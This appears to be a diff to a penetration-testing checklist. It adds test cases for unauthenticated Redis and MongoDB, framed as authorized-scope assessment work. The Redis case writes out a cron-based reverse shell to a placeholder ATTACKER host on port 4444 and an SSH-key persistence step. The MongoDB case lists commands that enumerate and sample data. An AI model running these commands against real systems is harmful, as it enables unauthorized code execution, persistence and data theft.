@@ -218,3 +218,30 @@ Reference Payload: Corresponding section in payloads.md
 - [ ] OS command execution achieved through database features
 - [ ] Password hashes extracted and cracking attempted
 - [ ] Linked servers and database cross-references enumerated for lateral movement
+
+---
+
+### TC-DB009 | Redis Unauthenticated Access to RCE
+
+- **Severity**: CRITICAL
+- **Prerequisites**: Redis detected on port 6379 (nmap); authorized scope covers the database host
+- **Test Steps**:
+  1. Test unauth access: `redis-cli -h TARGET ping`
+  2. If PONG without auth, enumerate: `redis-cli -h TARGET INFO server` (version, OS)
+  3. Attempt cron-based RCE (lab/linux): `redis-cli -h TARGET config set dir /var/spool/cron` then `config set dbfilename root` and `set x "\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n"` then `save`
+  4. Alternative SSH-key persistence: write `~/.ssh/authorized_keys` via the same config-set pattern
+  5. Verify callback/key login
+- **Expected Results**: Unauthenticated Redis write yields code execution or persistence, documenting the full chain with timeline evidence
+
+### TC-DB010 | MongoDB Unauthenticated Enumeration and Data Access
+
+- **Severity**: HIGH
+- **Prerequisites**: MongoDB detected on port 27017; default or absent authentication suspected
+- **Test Steps**:
+  1. `mongosh mongodb://TARGET:27017 --eval 'db.adminCommand({listDatabases:1})'`
+  2. On success, enumerate collections and document sensitive stores: `db.getCollectionNames()`
+  3. Sample records minimally (authorization evidence, not bulk extraction)
+  4. Check version against known RCE-class issues: `db.version()`
+  5. Record auth configuration: `db.runCommand({connectionStatus:1})`
+- **Expected Results**: Unauthenticated listing of databases/collections demonstrates full data exposure; version and auth posture documented for the report
+
